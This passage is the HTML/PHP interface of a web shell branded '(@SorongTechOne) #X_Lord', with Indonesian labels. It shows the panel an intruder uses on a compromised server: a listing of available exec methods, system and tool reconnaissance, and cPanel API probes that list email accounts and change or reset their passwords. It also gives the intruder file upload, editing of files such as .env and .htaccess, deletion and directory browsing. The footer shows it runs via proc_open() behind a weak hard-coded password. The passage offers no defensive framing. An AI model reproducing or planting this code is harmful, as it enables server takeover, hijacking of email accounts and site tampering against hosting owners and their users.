le><script>function confirmDelete(n){return confirm("Yakin mau hapus file: "+n+" ?")}function confirmLogout(){return confirm("Yakin mau logout?")}</script></head><body class="d-flex justify-content-center p-4"><div class="card shadow-lg w-100"><div class="card-body"><div class="logout-container"><a href="?logout=1"class="btn btn-sm btn-logout"onclick="return confirmLogout()">🚪 Logout</a></div><h2 class="text-center card-title mb-3 text-danger">(@SorongTechOne) #X_Lord</h2><div class="sysinfo-grid"><h5 class="mb-3 text-warning">🖥️ SYSTEM INFORMATION</h5><div class="mb-3"><strong>🚀 Exec Methods:</strong><?php foreach($execMethods as $name=>$status): ?><span class="exec-badge<?php echo $status==='✓'?'exec-ok':'exec-bad'; ?>"><?php echo $name.' '.$status; ?></span><?php endforeach; ?></div><div class="row"><div class="col-md-4"><div class="info-card"><strong>📋 Sistem Dasar</strong><br>OS:<?php echo $system["OS"]; ?><br>Host:<?php echo $system["Host"]; ?><br>Arch:<?php echo $system["Arch"]; ?><br>PHP:<?php echo $system["PHP"]; ?><br>Server:<?php echo $system["Server"]; ?><br></div></div><div class="col-md-4"><div class="info-card"><strong>⚙️ Bahasa & Tools</strong><br>Python: <span class="<?php echo strpos($pythonVersion,'Tidak')===false?'status-ok':'status-bad'; ?>"><?php echo htmlspecialchars($pythonVersion); ?></span><br>Ruby: <span class="<?php echo strpos($rubyVersion,'Tidak')===false?'status-ok':'status-bad'; ?>"><?php echo htmlspecialchars($rubyVersion); ?></span><br>Node.js: <span class="<?php echo strpos($nodeVersion,'Tidak')===false?'status-ok':'status-bad'; ?>"><?php echo htmlspecialchars($nodeVersion); ?></span><br>Symlink: <span class="<?php echo $symlinkTest?'status-ok':'status-bad'; ?>"><?php echo $symlinkTest?'✓ BISA':'✗ TIDAK BISA'; ?></span><br></div></div><div class="col-md-4"><div class="info-card"><strong>🎛️ cPanel Status</strong><br>cPanel API: <span class="<?php echo $hasCpapi2?'status-ok':'status-bad'; ?>"><?php echo $hasCpapi2?'✓ BERFUNGSI':'✗ TIDAK ADA'; ?></span><br>List Email: <span class="<?php echo $emailFunctions['listpops']?'status-ok':'status-bad'; ?>"><?php echo $emailFunctions['listpops']?'✓ ADA':'✗ TIDAK'; ?></span><br>Ganti Pass Email: <span class="<?php echo $emailFunctions['passwdpop']?'status-ok':'status-bad'; ?>"><?php echo $emailFunctions['passwdpop']?'✓ BISA':'✗ TIDAK'; ?></span><br>Reset Password: <span class="<?php echo $emailFunctions['change_password']?'status-ok':'status-bad'; ?>"><?php echo $emailFunctions['change_password']?'✓ BISA':'✗ TIDAK'; ?></span><br></div></div></div><?php if(!empty($emailList)): ?><div class="mt-3"><strong>📧 Daftar Email Account</strong><div class="mt-2 table-responsive"><table class="email-table"><thead><tr><th>Email Address</th><th>Login Name</th><th>Status</th></tr></thead><tbody><?php foreach($emailList as $email): ?><tr><td><?php echo htmlspecialchars($email['email']); ?></td><td><?php echo htmlspecialchars($email['login']); ?></td><td class="<?php echo $email['status']=='Aktif'?'status-ok':'status-bad'; ?>"><?php echo $email['status']; ?></td></tr><?php endforeach; ?></tbody></table></div><small class="text-muted">Total:<?php echo count($emailList); ?>email account ditemukan</small></div><?php else: ?><div class="mt-3"><span class="text-muted">📧 Tidak ada data email atau cPanel API tidak tersedia</span></div><?php endif; ?></div><?php if($uploadMsg)echo"<div class='mb-2'>$uploadMsg</div>"; ?><?php if($actionMsg)echo"<div class='mb-2'>$actionMsg</div>"; ?><?php if($editMode): ?><h5 class="text-warning">✏️ Edit File:<?php echo htmlspecialchars($editFileName); ?></h5><form action="?path=<?php echo urlencode($path); ?>"method="post"><input name="filename"type="hidden"value="<?php echo htmlspecialchars($editFileName); ?>"> <textarea name="content"><?php echo $editFileContent; ?></textarea><div class="mt-2"><button class="btn btn-success"name="save_file"type="submit">💾 Simpan</button> <a href="?path=<?php echo urlencode($path); ?>"class="btn btn-secondary">❌ Batal</a></div></form><?php else: ?><div class="mb-3"><form action="?path=<?php echo urlencode($path); ?>"method="post"enctype="multipart/form-data"><div class="input-group"><input name="file"type="file"class="form-control"required> <button class="btn btn-danger"name="upload"type="submit">Upload</button></div></form></div><p class="text-center text-light">Path: <code><?php echo $path; ?></code></p><div class="table-container"><table class="align-middle table table-dark table-hover table-striped"><thead><tr><th class="text-start">Nama</th><th class="text-center">Tipe</th><th class="text-center">Aksi</th></tr></thead><tbody><?php if($path!==dirname($path)): ?><tr><td class="text-start folder"><a href="?path=<?php echo urlencode($parent); ?>">⬆️ ..</a></td><td class="text-center">Kembali</td><td></td></tr><?php endif; ?><?php foreach($list as $item): ?><?php $full=$path.DIRECTORY_SEPARATOR.$item; ?><?php if(is_dir($full)): ?><tr><td class="text-start folder"><a href="?path=<?php echo urlencode($full); ?>">📁<?php echo htmlspecialchars($item); ?></a></td><td class="text-center">Folder</td><td></td></tr><?php else: ?><?php $ext=strtolower(pathinfo($item,PATHINFO_EXTENSION)); ?><tr><td class="text-start file">📄<?php echo htmlspecialchars($item); ?></td><td class="text-center">File</td><td class="text-center"><?php if(in_array($ext,['php','txt','html','js','css','json','xml','sql','md','py','rb','sh','bash','env','htaccess'])): ?><a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($item); ?>"class="btn btn-sm btn-warning">✏️ Edit</a><?php endif; ?><a href="?path=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($item); ?>"class="btn btn-sm btn-danger"onclick='return confirmDelete("<?php echo htmlspecialchars($item); ?>")'>🗑️ Hapus</a></td></tr><?php endif; ?><?php endforeach; ?></tbody></table></div><?php endif; ?><div class="text-center mt-3 text-muted"><small>Powered by proc_open() | Password:<?php echo md5('123456'); ?></small></div></div>